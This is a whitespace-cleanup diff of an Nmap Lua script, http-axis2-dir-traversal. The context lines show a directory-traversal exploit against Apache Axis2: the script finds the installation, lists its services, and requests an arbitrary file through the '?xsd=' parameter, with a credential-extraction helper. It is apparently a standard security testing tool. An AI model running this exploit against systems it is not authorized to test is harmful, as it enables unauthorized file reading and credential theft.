@@ -59,7 +59,7 @@ local function check_installation(host, port, path)
   local req = http.get(host, port, path)
   if req.status == 200 and http.response_contains(req, "Available services") then
     return true
-  end 
+  end
   return false
 end
 
@@ -68,13 +68,13 @@ end
 -- from the services list page
 -- @param body Services list page body
 -- @return Table containing the names and paths of the available services
-local function get_available_services(body) 
+local function get_available_services(body)
  local services = {}
  for service in string.gmatch(body, '<h4>Service%sDescription%s:%s<font%scolor="black">(.-)</font></h4>') do
     table.insert(services, service)
   end
 
-  return services 
+  return services
 end
 
 ---
@@ -113,12 +113,12 @@ local function extract_credentials(host, port, body)
 end
 
 action = function(host, port)
-  local outfile = stdnse.get_script_args("http-axis2-dir-traversal.outfile") 
+  local outfile = stdnse.get_script_args("http-axis2-dir-traversal.outfile")
   local rfile = stdnse.get_script_args("http-axis2-dir-traversal.file") or DEFAULT_FILE
   local basepath = stdnse.get_script_args("http-axis2-dir-traversal.basepath") or DEFAULT_PATH
   local selected_service, output
 
-  --check this is an axis2 installation  
+  --check this is an axis2 installation
   if not(check_installation(host, port, basepath.."listServices")) then
     stdnse.print_debug(1, "%s: This does not look like an Apache Axis2 installation.", SCRIPT_NAME)
     return
@@ -132,18 +132,18 @@ action = function(host, port)
   --generate debug info for services and select first one to be used in the request
   if #services > 0 then
     for _, servname in pairs(services) do
-      stdnse.print_debug(1, "%s: Service found: %s", SCRIPT_NAME, servname) 
-    end 
+      stdnse.print_debug(1, "%s: Service found: %s", SCRIPT_NAME, servname)
+    end
     selected_service = services[1]
   else
     if nmap.verbosity() >= 2 then
       stdnse.print_debug(1, "%s: There are no services available. We can't exploit this", SCRIPT_NAME)
     end
-    return 
+    return
   end
 
   --Use selected service and exploit
-  stdnse.print_debug(1, "%s: Querying service: %s", SCRIPT_NAME, selected_service)  
+  stdnse.print_debug(1, "%s: Querying service: %s", SCRIPT_NAME, selected_service)
   req = http.get(host, port, basepath..selected_service.."?xsd="..rfile)
   stdnse.print_debug(2, "%s: Query -> %s", SCRIPT_NAME, basepath..selected_service.."?xsd="..rfile)
 
